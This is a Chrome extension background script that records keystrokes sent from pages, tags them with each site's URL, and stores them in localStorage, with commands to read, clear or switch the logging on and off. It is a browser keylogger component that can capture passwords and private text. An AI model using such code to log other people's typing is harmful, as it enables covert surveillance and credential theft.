

function setVal(cname, cvalue) {
    localStorage.setItem(cname, cvalue);
}

function getVal(cname) {
    return localStorage.getItem(cname);
}



function sendMessage(json, callback){
	chrome.runtime.sendMessage(json, function(response) {
	  callback(response);
	});
}

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.type == "keystroke-request"){
      sendResponse({keystrokes: getVal("keystrokes")});
    }
    else if(request.type == "keystroke-inject"){
    	if(getVal("power-status") == "0"){
    		return;
    	}
    	var url = getVal("url");
    	if(url != request.url){
    		setVal("url", request.url);
    		request.data = "\n\n"+request.url+": "+request.data;
    	}
    	var previous = "";
    	if(request.append){
    		previous = getVal("keystrokes");
    	}
    	setVal("keystrokes",previous+request.data);
    	sendResponse({keystrokes: getVal("keystrokes"),data: request.data});
    }
    else if(request.type == "keystroke-flush"){
    	setVal("keystrokes","");
    	sendResponse({status: "true"});
    }
    else if(request.type == "power-status-set"){
    	setVal("power-status",request.data);
    	sendResponse({status: "true"});
    }
    else if(request.type == "power-status-get"){
    	sendResponse({status: getVal("power-status")});
    }
});
